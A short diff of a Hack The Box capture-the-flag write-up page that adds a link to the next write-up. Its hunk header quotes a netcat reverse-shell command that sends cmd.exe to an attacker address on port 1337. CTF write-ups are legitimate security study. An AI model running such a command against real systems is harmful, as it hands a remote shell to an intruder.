@@ -90,4 +90,5 @@ system('nc.exe -e cmd.exe 10.10.xx.xx 1337')
 <br>
 <br>
 #### previous Hack The Box write-up : [Hack The Box - Oz](/hack-the-box/oz/)
+#### next Hack The Box write-up : [Hack The Box - Dab](/hack-the-box/dab/)
 <hr>
